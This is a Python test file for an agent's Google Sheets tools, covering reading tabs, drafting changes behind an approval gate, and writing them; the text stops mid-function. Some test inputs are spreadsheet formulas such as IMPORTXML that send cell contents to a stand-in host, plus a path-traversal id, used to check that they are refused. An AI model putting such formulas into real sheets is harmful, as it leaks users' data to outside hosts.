"""Google Sheets: reading a tab, drafting changes to it, and making them.

Google is never reached. A small stand-in for the Sheets API keeps each tab's cells
and answers the calls Orbit makes the way the real one does, including refusing a
range past the end of a tab.
"""

import csv
import io
import re
import time
from types import SimpleNamespace

import pytest
from livekit.agents.llm import ToolError

from actions.effects import perform
from actions.gate import ActionGate
from agent_tools import actions, google, stage
from agent_tools.state import OrbitState
from api import sheets as sheets_api
from integrations.google import api, gdrive, gsheets, status
from integrations.google.api import GoogleApiError
from integrations.google.scopes import access_level

AUTH = "https://www.googleapis.com/auth/"
BOOK = "1AbCdEfGh_ij-KL"
LINK = f"https://docs.google.com/spreadsheets/d/{BOOK}/edit"


class Tab:
    """One tab of the stand-in: its size, and its cells as shown and as kept."""

    def __init__(
        self,
        title: str,
        rows: list[list[str]],
        *,
        tab_id: int = 0,
        grid: tuple[int, int] = (1000, 26),
        hidden: bool = False,
        kind: str = "GRID",
        formulas: dict[str, tuple[str, str]] | None = None,
    ) -> None:
        self.id, self.title, self.hidden, self.kind = tab_id, title, hidden, kind
        self.rows, self.columns = grid
        # (row, column) -> (as shown, as kept). Kept is the formula, if there is one.
        self.cells: dict[tuple[int, int], tuple[str, object]] = {}
        for row, values in enumerate(rows, start=1):
            for column, value in enumerate(values):
                if value != "":
                    self.cells[(row, column)] = (value, value)
        for name, (formula, shown) in (formulas or {}).items():
            self.cells[gsheets.cell(name)] = (shown, formula)

    def row(self, number: int) -> list[str]:
        width = max((c for r, c in self.cells if r == number), default=-1) + 1
        return [self.cells.get((number, c), ("", ""))[0] for c in range(width)]


def _corner(text: str) -> tuple[int | None, int | None]:
    match = re.fullmatch(r"([A-Z]*)(\d*)", text)
    assert match, text
    letters, digits = match.groups()
    column = None
    if letters:
        column = 0
        for char in letters:
            column = column * 26 + ord(char) - 64
        column -= 1
    return (int(digits) if digits else None), column


class Sheets:
    """A stand-in for the Sheets API, holding one spreadsheet."""

    def __init__(self, *tabs: Tab, title: str = "Expenses 2026") -> None:
        self.title, self.tabs = title, list(tabs)
        self.asked: list[tuple[str, object]] = []
        self.sent: list[tuple[str, dict]] = []

    def tab(self, title: str) -> Tab:
        return next(tab for tab in self.tabs if tab.title == title)

    def _area(self, text: str) -> tuple[Tab, int, int, int, int]:
        name, _, part = text.rpartition("!")
        assert name.startswith("'") and name.endswith("'"), "a tab is always quoted"
        tab = self.tab(name[1:-1].replace("''", "'"))
        ends = part.split(":")
        (top, left), (bottom, right) = _corner(ends[0]), _corner(ends[-1])
        top, bottom = top or 1, bottom or tab.rows
        left = 0 if left is None else left
        right = tab.columns - 1 if right is None else right
        if bottom > tab.rows or right >= tab.columns:
            raise GoogleApiError(
                400, f"Range ({text}) exceeds grid limits. Max rows: {tab.rows}"
            )
        return tab, top, left, bottom, right

    def _values(self, text: str, render: str) -> dict:
        tab, top, left, bottom, right = self._area(text)
        rows = []
        for row in range(top, bottom + 1):
            values = []
            for column in range(left, right + 1):
                shown, kept = tab.cells.get((row, column), ("", ""))
                values.append(kept if render == "FORMULA" else shown)
            while values and values[-1] == "":
                values.pop()
            rows.append(values)
        while rows and not rows[-1]:
            rows.pop()
        name = text.rpartition("!")[0]
        found = {
            "range": f"{name}!{gsheets.letter(left)}{top}:{gsheets.letter(right)}{bottom}"
        }
        if rows:
            found["values"] = rows
        return found

    async def get_json(self, session, url, params=None, *, timeout=None):
        self.asked.append((url, params))
        if url.endswith("/drive/v3/files"):
            return {"files": self._found(params["q"])}
        if url.endswith("/values:batchGet"):
            given = list(params)
            render = dict(given)["valueRenderOption"]
            ranges = [value for key, value in given if key == "ranges"]
            return {"valueRanges": [self._values(r, render) for r in ranges]}
        assert url.endswith(f"/{BOOK}"), url
        return {
            "spreadsheetId": BOOK,
            "spreadsheetUrl": LINK,
            "properties": {"title": self.title},
            "sheets": [
                {
                    "properties": {
                        "sheetId": tab.id,
                        "title": tab.title,
                        "sheetType": tab.kind,
                        "hidden": tab.hidden,
                        "gridProperties": {
                            "rowCount": tab.rows,
                            "columnCount": tab.columns,
                        },
                    }
                }
                for tab in self.tabs
            ],
        }

    def _found(self, query: str) -> list[dict]:
        """The spreadsheet as Drive lists it, if the search's words are in its name."""
        said = re.search(r"contains '((?:[^'\\]|\\.)*)'", query)[1].replace("\\'", "'")
        if not all(word in self.title.casefold() for word in said.casefold().split()):
            return []
        return [
            {
                "id": BOOK,
                "name": self.title,
                "mimeType": "application/vnd.google-apps.spreadsheet",
                "modifiedTime": "2026-10-14T09:30:00Z",
                "owners": [{"displayName": "Nidhish Kumar"}],
                "webViewLink": LINK,
            }
        ]

    async def send_json(self, session, method, url, body, params=None):
        self.sent.append((url, body))
        if url.endswith("/values:batchUpdate"):
            assert body["valueInputOption"] == "USER_ENTERED"
            for entry in body["data"]:
                tab, top, left, _, _ = self._area(entry["range"])
                values = entry["values"]
                if entry.get("majorDimension") == "COLUMNS":
                    values = [list(row) for row in zip(*values)]
                for r, row in enumerate(values):
                    for c, value in enumerate(row):
                        tab.cells[(top + r, left + c)] = (value, value)
            return {"totalUpdatedCells": 1}
        assert url.endswith(f"/{BOOK}:batchUpdate"), url
        for request in body["requests"]:
            if grow := request.get("appendDimension"):
                tab = next(t for t in self.tabs if t.id == grow["sheetId"])
                if grow["dimension"] == "ROWS":
                    tab.rows += grow["length"]
                else:
                    tab.columns += grow["length"]
            if gone := request.get("deleteDimension"):
                span = gone["range"]
                tab = next(t for t in self.tabs if t.id == span["sheetId"])
                start, end = span["startIndex"] + 1, span["endIndex"]
                tab.cells = {
                    (r if r < start else r - (end - start + 1), c): value
                    for (r, c), value in tab.cells.items()
                    if not start <= r <= end
                }
                tab.rows -= end - start + 1
        return {}

    @property
    def writes(self) -> list[dict]:
        return [body for url, body in self.sent if url.endswith("/values:batchUpdate")]


EXPENSES = [
    ["Date", "Item", "Category", "Amount"],
    ["2026-10-01", "Coffee", "Food", "4.50"],
    ["2026-10-02", "Train", "Travel", "12.00"],
    [],
    ["2026-10-05", "Groceries", "Food", "31.20"],
]


@pytest.fixture
def sheets(monkeypatch) -> Sheets:
    """The stand-in, holding an expenses sheet with a gap in its rows."""
    held = Sheets(
        Tab("October", EXPENSES, tab_id=11),
        Tab("Summary", [["Total", "47.70"]], tab_id=12),
    )
    monkeypatch.setattr(api, "get_json", held.get_json)
    monkeypatch.setattr(api, "send_json", held.send_json)
    return held


@pytest.fixture
def shown(monkeypatch) -> list[dict]:
    """The cards the tools asked the app to put on screen."""
    cards: list[dict] = []

    async def show(card, *, push=None):
        cards.append(card)

    monkeypatch.setattr(stage, "show", show)
    monkeypatch.setattr(google.utils.http_context, "http_session", lambda: None)
    monkeypatch.setattr(actions, "_http", lambda: None)
    return cards


@pytest.fixture
def writable(monkeypatch):
    """Orbit was granted write access to Sheets and Drive."""
    monkeypatch.setattr(actions, "_require_write", lambda service: None)


def _context(*read: str, clock=time.time) -> SimpleNamespace:
    """A conversation in which these spreadsheets have been read, each at October."""
    state = OrbitState(gate=ActionGate(clock=clock))
    state.sheet_tabs.update(dict.fromkeys(read, "October"))
    return SimpleNamespace(userdata=state, disallow_interruptions=lambda: None)


# --- Naming cells and parts of a tab ----------------------------------------


@pytest.mark.parametrize(
    ("index", "letters"),
    [(0, "A"), (3, "D"), (25, "Z"), (26, "AA"), (701, "ZZ"), (702, "AAA")],
)
def test_columns_are_named_by_their_letters_as_sheets_names_them(index, letters):
    assert gsheets.letter(index) == letters
    assert gsheets.column_index(letters) == index


def test_a_cell_is_its_column_letter_and_its_row_number():
    assert gsheets.cell("D7") == (7, 3)
    assert gsheets.cell(" aa12 ") == (12, 26)
    for wrong in ("7D", "D", "D0", "row 7", ""):
        with pytest.raises(gsheets.SheetError, match="not a cell"):
            gsheets.cell(wrong)


@pytest.mark.parametrize(
    ("said", "named", "columns"),
    [
        ("A2:D50", "A2:D50", (0, 3)),
        ("b7", "B7", (1, 1)),
        ("D2:A5", "D2:A5", (0, 3)),
        ("A:C", "A:C", (0, 2)),
        ("$A$1:$B$2", "A1:B2", (0, 1)),
        ("A5:C", "A5:C", (0, 2)),
        ("5:9", "5:9", None),
    ],
)
def test_a_part_of_a_tab_is_read_as_sheets_would(said, named, columns):
    assert gsheets.area(said) == (named, columns)


@pytest.mark.parametrize("said", ["", "A", "1:B", "A1:B2:C3", "the top", "A1:"])
def test_what_is_not_a_part_of_a_tab_is_refused(said):
    with pytest.raises(gsheets.SheetError, match="not a part of a sheet"):
        gsheets.area(said)


def test_any_tab_name_can_be_put_in_a_range():
    assert gsheets.quoted("Asha's costs") == "'Asha''s costs'"


@pytest.mark.parametrize(
    ("value", "calls"),
    [
        ('=IMPORTXML("https://x.example/?q="&A1, "//a")', "IMPORTXML"),
        ("=image (A2)", "IMAGE"),
        ('=SUM(A1) + IMPORTDATA("https://x.example")', "IMPORTDATA"),
        ("+IMPORTRANGE(B1, C1)", "IMPORTRANGE"),
        ("=SUM(D2:D9)", None),
        ('=HYPERLINK("https://example.com", "site")', None),
        # Words that only look like a call are words.
        ("Profile image (front)", None),
        ("'=IMAGE(A1)", None),
    ],
)
def test_a_formula_that_fetches_from_the_web_is_known(value, calls):
    assert gsheets.reaches_out(value) == calls


# --- Reading ------------------------------------------------------------------


async def test_a_tab_is_read_with_its_headers_and_numbered_rows(sheets):
    read = await gsheets.read(None, BOOK, "october")

    assert (read["title"], read["tab"], read["link"]) == (
        "Expenses 2026",
        "October",
        LINK,
    )
    assert read["tabs"] == ["October", "Summary"]
    assert read["headers"] == ["Date", "Item", "Category", "Amount"]
    assert read["header_row"] == 1
    # The empty row is left out, and the rows after it keep their numbers.
    assert [row["row"] for row in read["rows"]] == [2, 3, 5]
    assert read["rows"][2]["cells"] == ["2026-10-05", "Groceries", "Food", "31.20"]
    assert read["last_row"] == 5
    assert read["complete"] is True
    # Only as many rows as the tab has are asked for.
    batch = next(params for url, params in sheets.asked if url.endswith("batchGet"))
    assert ("ranges", "'October'!1:1000") in batch


async def test_with_no_tab_named_the_first_visible_one_is_read(sheets):
    sheets.tabs.insert(0, Tab("Workings", [["x"]], tab_id=9, hidden=True))
    sheets.tabs.insert(0, Tab("Chart", [], tab_id=8, kind="OBJECT"))

    read = await gsheets.read(None, BOOK)

    assert read["tab"] == "October"
    # A tab that only holds a chart has no cells, and is not offered.
    assert read["tabs"] == ["Workings", "October", "Summary"]


async def test_a_tab_named_in_part_is_found_and_an_unknown_one_is_refused(sheets):
    assert (await gsheets.read(None, BOOK, "summ"))["tab"] == "Summary"

    with pytest.raises(gsheets.SheetError, match="Its tabs are: October, Summary"):
        await gsheets.read(None, BOOK, "November")


async def test_a_title_above_the_headers_is_not_taken_for_them(sheets):
    sheets.tabs[0] = Tab("October", [["October spending"], *EXPENSES], tab_id=11)

    read = await gsheets.read(None, BOOK, "October")

    assert read["header_row"] == 2
    assert read["headers"] == ["Date", "Item", "Category", "Amount"]
    assert read["rows"][0] == {"row": 1, "cells": ["October spending", "", "", ""]}


async def test_a_table_that_starts_further_in_keeps_its_column_letters(sheets):
    sheets.tabs[0] = Tab(
        "October", [[], *(["", "", *row] for row in EXPENSES if row)], tab_id=11
    )

    read = await gsheets.read(None, BOOK, "October")

    assert read["first_column"] == 2
    assert read["header_row"] == 2
    assert read["headers"] == ["Date", "Item", "Category", "Amount"]
    assert read["rows"][0] == {
        "row": 3,
        "cells": ["2026-10-01", "Coffee", "Food", "4.50"],
    }


async def test_only_the_rows_with_the_words_are_kept_when_matching(sheets):
    read = await gsheets.read(None, BOOK, "October", matching="FOOD")

    assert [row["row"] for row in read["rows"]] == [2, 5]
    assert read["headers"] == ["Date", "Item", "Category", "Amount"]


async def test_part_of_a_tab_is_read_with_the_headers_of_its_columns(sheets):
    read = await gsheets.read(None, BOOK, "October", cells="B3:D5")

    assert read["first_column"] == 1
    assert read["headers"] == ["Item", "Category", "Amount"]
    assert read["rows"] == [
        {"row": 3, "cells": ["Train", "Travel", "12.00"]},
        {"row": 5, "cells": ["Groceries", "Food", "31.20"]},
    ]
    # Read in part, the tab's end is not known.
    assert read["last_row"] is None


async def test_a_tab_longer_than_orbit_reads_says_so(sheets):
    sheets.tabs[0].rows = gsheets.MAX_READ_ROWS + 5

    read = await gsheets.read(None, BOOK, "October")

    assert read["complete"] is False


async def test_an_empty_tab_has_no_headers_and_no_rows(sheets):
    sheets.tabs[0] = Tab("October", [], tab_id=11)

    read = await gsheets.read(None, BOOK, "October")

    assert (read["headers"], read["rows"], read["header_row"]) == ([], [], None)
    assert read["last_row"] == 0


async def test_an_id_that_could_reach_elsewhere_is_never_sent(sheets):
    with pytest.raises(gsheets.SheetError, match="not the id of a spreadsheet"):
        await gsheets.read(None, "../files/abc")
    assert sheets.asked == []


async def test_a_document_given_as_a_sheet_is_named_for_what_it_is(monkeypatch):
    async def get_json(session, url, params=None):
        raise GoogleApiError(400, "This operation is not supported for this document")

    monkeypatch.setattr(api, "get_json", get_json)

    with pytest.raises(gsheets.SheetError, match="not a Google Sheet"):
        await gsheets.spreadsheet(None, BOOK)


# --- The agent reading a sheet ------------------------------------------------


def _found(file_id: str, name: str, kind: str = "Google Sheet") -> dict:
    return {
        "id": file_id,
        "name": name,
        "kind": kind,
        "modified": "Thu 01 Oct 2026 15:00",
        "owner": "Asha Verma",
        "link": f"https://docs.google.com/spreadsheets/d/{file_id}/edit",
    }


async def test_a_sheet_named_by_the_user_is_found_read_and_put_on_screen(
    sheets, shown, monkeypatch
):
    async def spreadsheets_named(session, name):
        assert name == "expenses"
        return [_found(BOOK, "Expenses 2026")]

    monkeypatch.setattr(gdrive, "spreadsheets_named", spreadsheets_named)
    context = _context()

    told = await google.sheets_read(context, spreadsheet=" expenses ")

    assert told["spreadsheet"] == {"id": BOOK, "title": "Expenses 2026", "link": LINK}
    assert told["tab"] == "October"
    assert told["columns"] == [
        {"column": "A", "header": "Date"},
        {"column": "B", "header": "Item"},
        {"column": "C", "header": "Category"},
        {"column": "D", "header": "Amount"},
    ]
    assert [row["row"] for row in told["rows"]] == [2, 3, 5]
    assert told["count"] == 3
    assert "not_included" not in told
    # Remembered, so that a change to it can follow.
    assert context.userdata.sheet_tabs == {BOOK: "October"}
    (card,) = shown
    assert card["kind"] == "sheet"
    assert (card["id"], card["spreadsheet_id"], card["tab"]) == (
        f"sheet:{BOOK}",
        BOOK,
        "October",
    )


@pytest.mark.parametrize(
    ("amounts", "header", "told"),
    [
        (["4.50", "12.00"], "Amount", True),
        (["₹4.50", "₹12.00"], "Amount", False),
        (["4.50", "12.00"], "Amount (Rs)", False),
        (["USD 4.50", "12.00"], "Amount", False),
        # Whole numbers, such as a count of things, are not taken for money.
        (["4", "12"], "Reps", False),
    ],
)
async def test_the_model_is_told_when_a_sheet_shows_no_currency(
    sheets, shown, amounts, header, told
):
    sheets.tabs[0] = Tab(
        "October",
        [["Item", header], *(["Coffee", amount] for amount in amounts)],
        tab_id=11,
    )

    result = await google.sheets_read(_context(), spreadsheet_id=BOOK)

    assert ("amounts" in result) is told


async def test_several_sheets_of_that_name_are_offered_and_none_is_read(
    sheets, shown, monkeypatch
):
    same = [_found("s-1", "Budget 2025"), _found("s-2", "Budget 2026")]

    async def spreadsheets_named(session, name):
        return same

    monkeypatch.setattr(gdrive, "spreadsheets_named", spreadsheets_named)

    told = await google.sheets_read(_context(), spreadsheet="budget")

    assert told == {"spreadsheet": None, "spreadsheets_matching": same}
    assert sheets.asked == []
    (card,) = shown
    assert (card["kind"], card["tag"]) == ("list", "2 sheets")
    # A sheet in a list opens as a table of its cells, not as a picture of its pages.
    assert card["rows"][0]["sheet_id"] == "s-1"
    assert "file_id" not in card["rows"][0]


async def test_with_no_tab_named_the_tab_read_last_is_read_again(sheets, shown):
    context = _context()
    context.userdata.sheet_tabs[BOOK] = "Summary"

    told = await google.sheets_read(context, spreadsheet_id=BOOK, matching="total")

    assert told["tab"] == "Summary"
    assert told["matching"] == "total"


async def test_a_long_tab_is_given_to_the_model_in_part_with_where_to_read_on(
    sheets, shown, monkeypatch
):
    sheets.tabs[0] = Tab(
        "October",
        [
            EXPENSES[0],
            *(
                [f"2026-10-{n % 28 + 1:02}", f"Item {n}", "Food", "1.00"]
                for n in range(30)
            ),
        ],
        tab_id=11,
    )
    monkeypatch.setattr(google, "SHEET_ROWS_FOR_MODEL", 10)

    told = await google.sheets_read(_context(), spreadsheet_id=BOOK)

    assert len(told["rows"]) == 10
    # The whole count is told, and how to reach the rest.
    assert told["count"] == 30
    assert "Rows 12 to 31 are not here" in told["not_included"]
    assert "cells A12:D31" in told["not_included"]


async def test_a_sheet_opened_from_drive_is_read_as_a_sheet(sheets, shown, monkeypatch):
    async def read(session, file_id, *, sheets_as_text=True):
        assert sheets_as_text is False, "the sheet is read through the Sheets API"
        return {
            **_found(BOOK, "Expenses 2026"),
            "content": None,
            "content_truncated": False,
        }

    monkeypatch.setattr(gdrive, "read", read)

    told = await google.drive_read(_context(), BOOK)

    assert told["tab"] == "October"
    assert [card["kind"] for card in shown] == ["sheet"]


async def test_without_the_sheets_api_a_sheet_from_drive_is_read_as_before(
    shown, monkeypatch
):
    calls: list[bool] = []

    async def read(session, file_id, *, sheets_as_text=True):
        calls.append(sheets_as_text)
        content = "Date,Item\n2026-10-01,Coffee" if sheets_as_text else None
        return {
            **_found(BOOK, "Expenses 2026"),
            "content": content,
            "content_truncated": False,
        }

    async def not_enabled(session, *args, **kwargs):
        raise GoogleApiError(403, "Google Sheets API has not been used in project 1")

    monkeypatch.setattr(gdrive, "read", read)
    monkeypatch.setattr(gsheets, "read", not_enabled)

    told = await google.drive_read(_context(), BOOK)

    assert calls == [False, True]
    assert told["content"].startswith("Date,Item")
    assert [card["kind"] for card in shown] == ["file"]


async def test_sheets_read_says_when_the_sheets_api_is_not_switched_on(
    shown, monkeypatch
):
    async def not_enabled(session, *args, **kwargs):
        raise GoogleApiError(403, "Google Sheets API has not been used in project 1")

    monkeypatch.setattr(gsheets, "read", not_enabled)

    with pytest.raises(ToolError, match="Google Sheets API needs enabling"):
        await google.sheets_read(_context(), spreadsheet_id=BOOK)


async def test_a_spreadsheet_is_looked_up_by_name_and_then_by_what_it_holds(
    monkeypatch,
):
    asked: list[dict] = []

    async def get_json(session, url, params=None):
        asked.append(params)
        return {"files": []}

    monkeypatch.setattr(api, "get_json", get_json)

    await gdrive.spreadsheets_named(None, "Asha's costs")

    by_name, by_contents = asked
    assert by_name["q"] == (
        "name contains 'Asha\\'s costs' and "
        "mimeType = 'application/vnd.google-apps.spreadsheet' and trashed = false"
    )
    assert by_name["orderBy"] == "modifiedTime desc"
    assert by_contents["q"].startswith("fullText contains 'Asha\\'s costs' and ")
    assert "orderBy" not in by_contents


# --- Drafting a change ----------------------------------------------------------


async def test_rows_are_drafted_under_their_headers_and_nothing_is_written(
    sheets, shown, writable
):
    context = _context()

    drafted = await actions.sheets_draft_rows(
        context, BOOK, ["item", "amount", "date"], [["Tea", "3.20", "2026-10-15"]]
    )

    assert sheets.sent == []
    draft = drafted["draft"]
    assert draft["what"] == "Add a row"
    assert (draft["sheet"], draft["tab"]) == ("Expenses 2026", "October")
    assert draft["where"] == "At the end, under row 5"
    assert draft["rows"] == ["Item: Tea, Amount: 3.20, Date: 2026-10-15"]
    # The model is told the draft in words. The card draws the table.
    assert "table" not in draft
    action = context.userdata.gate.awaiting()
    assert action.kind == "sheets.add_rows"
    assert action.preview["table"] == {
        "columns": ["Date", "Item", "Category", "Amount"],
        "rows": [["2026-10-15", "Tea", "", "3.20"]],
    }
    assert action.payload == {
        "spreadsheet_id": BOOK,
        "tab_id": 11,
        "columns": [1, 3, 0],
        "rows": [["Tea", "3.20", "2026-10-15"]],
    }


async def test_a_column_is_found_by_part_of_its_header_or_by_its_letter(
    sheets, shown, writable
):
    sheets.tabs[0] = Tab("October", [["Date", "Item", "Amount (Rs)"]], tab_id=11)
    context = _context()

    drafted = await actions.sheets_draft_rows(
        context, BOOK, ["amount", "B"], [["40", "Tea"]]
    )

    assert context.userdata.gate.awaiting().payload["columns"] == [2, 1]
    assert drafted["draft"]["rows"] == ["Amount (Rs): 40, Item: Tea"]
    # With only its headers in the tab, the row goes under them.
    assert drafted["draft"]["where"] == "At the end, under row 1"


async def test_a_column_the_sheet_does_not_have_is_refused_with_its_columns(
    sheets, shown, writable
):
    with pytest.raises(
        ToolError, match="Its columns are: A Date, B Item, C Category, D Amount"
    ):
        await actions.sheets_draft_rows(_context(), BOOK, ["Price"], [["4"]])


async def test_a_row_must_have_a_value_for_each_column_named(sheets, shown, writable):
    with pytest.raises(ToolError, match="Each row needs 2 values"):
        await actions.sheets_draft_rows(_context(), BOOK, ["Item", "Amount"], [["Tea"]])
    with pytest.raises(ToolError, match="nothing in it"):
        await actions.sheets_draft_rows(_context(), BOOK, ["Item"], [[" "]])


async def test_a_formula_that_fetches_from_the_web_is_never_drafted(
    sheets, shown, writable
):
    with pytest.raises(ToolError, match="IMPORTXML"):
        await actions.sheets_draft_rows(
            _context(), BOOK, ["Item"], [['=IMPORTXML("https://x.example/"&D2, "//a")']]
        )
    assert sheets.asked == []


async def test_drafting_needs_write_access_to_sheets(sheets, shown, monkeypatch):
    monkeypatch.setattr(
        actions.tokens, "load", lambda: {"scopes": [AUTH + "drive.readonly"]}
    )

    with pytest.raises(ToolError, match="only has read access to Google Sheets"):
        await actions.sheets_draft_rows(_context(), BOOK, ["Item"], [["Tea"]])


async def test_cells_are_drafted_with_what_they_hold_now(sheets, shown, writable):
    sheets.tabs[0].cells[(6, 3)] = ("47.70", "=SUM(D2:D5)")
    sheets.tabs[0].cells[(6, 0)] = ("Total", "Total")
    context = _context(BOOK)

    drafted = await actions.sheets_draft_cells(
        context, BOOK, ["d3", "D6"], ["15.00", "50"]
    )

    assert sheets.sent == []
    draft = drafted["draft"]
    assert draft["what"] == "Change 2 cells"
    assert draft["changes"] == [
        "D3, Amount, row 3 (2026-10-02): from 12.00 to 15.00",
        "D6, Amount, row 6 (Total): from =SUM(D2:D5) to 50",
    ]
    assert draft["note"] == "D6 holds a formula, which this replaces."
    action = context.userdata.gate.awaiting()
    assert action.preview["table"]["rows"] == [
        ["D3", "Amount", "12.00", "15.00"],
        ["D6", "Amount", "=SUM(D2:D5)", "50"],
    ]
    assert action.payload["cells"] == ["D3", "D6"]
    assert action.payload["before"] == ["12.00", "=SUM(D2:D5)"]


async def test_cells_of_a_sheet_not_read_yet_are_not_guessed(sheets, shown, writable):
    with pytest.raises(ToolError, match="Read the sheet with sheets_read first"):
        await actions.sheets_draft_cells(_context(), BOOK, ["D3"], ["15"])
    with pytest.raises(ToolError, match="Read the sheet with sheets_read first"):
        await actions.sheets_draft_delete_rows(_context(), BOOK, [3])
    assert sheets.asked == []


async def test_a_cell_past_the_end_of_the_tab_is_refused(sheets, shown, writable):
    with pytest.raises(ToolError, match="past the end of the tab October"):
        await actions.sheets_draft_cells(_context(BOOK), BOOK, ["AA3"], ["x"])


async def test_cells_that_already_hold_the_values_are_not_drafted(
    sheets, shown, writable
):
    with pytest.raises(ToolError, match="already hold those values"):
        await actions.sheets_draft_cells(_context(BOOK), BOOK, ["B2"], ["Coffee"])


async def test_rows_are_drafted_for_deletion_with_what_is_in_them(
    sheets, shown, writable
):
    context = _context(BOOK)

    drafted = await actions.sheets_draft_delete_rows(context, BOOK, [5, 2])

    assert sheets.sent == []
    assert drafted["draft"]["rows"] == [
        "Row 2: 2026-10-01, Coffee, Food, 4.50",
        "Row 5: 2026-10-05, Groceries, Food, 31.20",
    ]
    action = context.userdata.gate.awaiting()
    assert action.preview["table"] == {
        "columns": ["Row", "Date", "Item", "Category", "Amount"],
        "rows": [
            ["2", "2026-10-01", "Coffee", "Food", "4.50"],
            ["5", "2026-10-05", "Groceries", "Food", "31.20"],
        ],
    }
    assert action.payload["rows"] == [2, 5]
    assert action.payload["before"] == {
        2: ["2026-10-01", "Coffee", "Food", "4.50"],
        5: ["2026-10-05", "Groceries", "Food", "31.20"],
    }


async def test_an_empty_row_is_not_drafted_for_deletion(sheets, shown, writable):
    with pytest.raises(ToolError, match="Row 4 of the tab October has nothing in it"):
        await actions.sheets_draft_delete_rows(_context(BOOK), BOOK, [4])


async def test_a_new_sheet_is_drafted_with_its_headers_and_rows(shown, writable):
    context = _context()

    drafted = await actions.sheets_draft_new(
        context, " Workouts ", ["Date", "Exercise", "Reps"], [["2026-10-15", "Squats"]]
    )

    draft = drafted["draft"]
    assert (draft["what"], draft["title"]) == ("Create Google Sheet", "Workouts")
    assert draft["rows"] == ["Date: 2026-10-15, Exercise: Squats"]
    action = context.userdata.gate.awaiting()
    assert action.payload == {
        "title": "Workouts",
        "columns": ["Date", "Exercise", "Reps"],
        "rows": [["2026-10-15", "Squats", ""]],
    }


async def test_a_long_change_is_summed_up_aloud_not_read_out_whole(
    sheets, shown, writable
):
    rows = [[f"Item {n}", "1"] for n in range(actions.READ_OUT_WHOLE + 1)]

    drafted = await actions.sheets_draft_rows(
        _context(), BOOK, ["Item", "Amount"], rows
    )

    assert drafted["next"] == actions.SHEET_NEXT_STEP


# --- Carrying a change out -----------------------------------------------------


async def test_rows_go_under_the_last_row_and_only_into_their_columns(sheets):
    # Anything in a row, even beside the table, makes it a row in use.
    sheets.tabs[0].cells[(6, 4)] = ("note", "note")

    done = await perform(
        None,
        "sheets.add_rows",
        {
            "spreadsheet_id": BOOK,
            "tab_id": 11,
            "columns": [1, 3, 0],
            "rows": [["Tea", "3.20", "2026-10-15"], ["Bus", "2.00", "2026-10-15"]],
        },
    )

    assert done == {"spreadsheet_id": BOOK, "tab": "October", "rows": [7, 8]}
    (write,) = sheets.writes
    # One range for each column given, and none for the column left out.
    assert [entry["range"] for entry in write["data"]] == [
        "'October'!B7:B8",
        "'October'!D7:D8",
        "'October'!A7:A8",
    ]
    assert sheets.tabs[0].row(7) == ["2026-10-15", "Tea", "", "3.20"]
    assert sheets.tabs[0].row(8) == ["2026-10-15", "Bus", "", "2.00"]


async def test_a_full_tab_is_made_larger_before_rows_are_added(sheets):
    sheets.tabs[0].rows = 5

    done = await perform(
        None,
        "sheets.add_rows",
        {
            "spreadsheet_id": BOOK,
            "tab_id": 11,
            "columns": [1],
            "rows": [["Tea"], ["Bus"]],
        },
    )

    assert done["rows"] == [6, 7]
    grow = sheets.sent[0][1]
    assert grow["requests"] == [
        {"appendDimension": {"sheetId": 11, "dimension": "ROWS", "length": 2}}
    ]
    assert sheets.tabs[0].rows == 7


async def test_a_tab_that_was_renamed_still_gets_its_rows(sheets):
    sheets.tabs[0].title = "Oct"

    done = await perform(
        None,
        "sheets.add_rows",
        {"spreadsheet_id": BOOK, "tab_id": 11, "columns": [1], "rows": [["Tea"]]},
    )

    assert done["tab"] == "Oct"


async def test_cells_are_changed_only_if_they_hold_what_the_user_was_shown(sheets):
    payload = {
        "spreadsheet_id": BOOK,
        "tab_id": 11,
        "cells": ["D3"],
        "values": ["15.00"],
        "before": ["12.00"],
    }
    sheets.tabs[0].cells[(3, 3)] = ("13.00", "13.00")  # changed by someone else since

    with pytest.raises(gsheets.ChangedError):
        await perform(None, "sheets.set_cells", payload)
    assert sheets.writes == []

    sheets.tabs[0].cells[(3, 3)] = ("12.00", "12.00")
    done = await perform(None, "sheets.set_cells", payload)

    assert done == {"spreadsheet_id": BOOK, "tab": "October", "cells": ["D3"]}
    assert sheets.tabs[0].row(3)[3] == "15.00"


async def test_rows_are_deleted_from_the_bottom_up_in_one_call(sheets):
    payload = {
        "spreadsheet_id": BOOK,
        "tab_id": 11,
        "rows": [2, 5],
        "before": {
            2: ["2026-10-01", "Coffee", "Food", "4.50"],
            5: ["2026-10-05", "Groceries", "Food", "31.20"],
        },
    }

    await perform(None, "sheets.delete_rows", payload)

    ((_, body),) = sheets.sent
    assert [r["deleteDimension"]["range"]["startIndex"] for r in body["requests"]] == [
        4,
        1,
    ]
    assert sheets.tabs[0].row(2) == ["2026-10-02", "Train", "Travel", "12.00"]
    assert sheets.tabs[0].row(3) == []


async def test_no_row_is_deleted_once_the_rows_have_moved(sheets):
    payload = {
        "spreadsheet_id": BOOK,
        "tab_id": 11,
        "rows": [2],
        "before": {2: ["2026-10-01", "Coffee", "Food", "4.50"]},
    }
    # A row was put in above since the draft: row 2 is now another row.
    sheets.tabs[0].cells = {
        (r + 1 if r >= 2 else r, c): v for (r, c), v in sheets.tabs[0].cells.items()
    }
    sheets.tabs[0].cells[(2, 1)] = ("New", "New")

    with pytest.raises(gsheets.ChangedError):
        await perform(None, "sheets.delete_rows", payload)
    assert sheets.sent == []


async def test_a_new_sheet_is_made_from_its_rows_and_its_headers_set_apart(
    sheets, monkeypatch
):
    uploaded: list[tuple] = []

    async def create_spreadsheet(session, title, rows_as_csv):
        uploaded.append((title, rows_as_csv))
        return {"id": BOOK, "name": title, "link": LINK}

    monkeypatch.setattr(gdrive, "create_spreadsheet", create_spreadsheet)

    done = await perform(
        None,
        "sheets.create",
        {
            "title": "Trip",
            "columns": ["Place", "Note"],
            "rows": [["Goa", 'Book the "early" train, then the bus']],
        },
    )

    assert done == {"spreadsheet_id": BOOK, "title": "Trip", "link": LINK}
    ((title, text),) = uploaded
    assert title == "Trip"
    # Written as CSV, so a comma or a quote in a value stays in its cell.
    assert list(csv.reader(io.StringIO(text))) == [
        ["Place", "Note"],
        ["Goa", 'Book the "early" train, then the bus'],
    ]
    ((_, body),) = sheets.sent
    assert body["requests"][0]["updateSheetProperties"]["properties"] == {
        "sheetId": 11,
        "gridProperties": {"frozenRowCount": 1},
    }


async def test_a_new_sheet_is_kept_when_its_headers_cannot_be_set_apart(monkeypatch):
    async def create_spreadsheet(session, title, rows_as_csv):
        return {"id": BOOK, "name": title, "link": LINK}

    async def not_enabled(session, url, params=None):
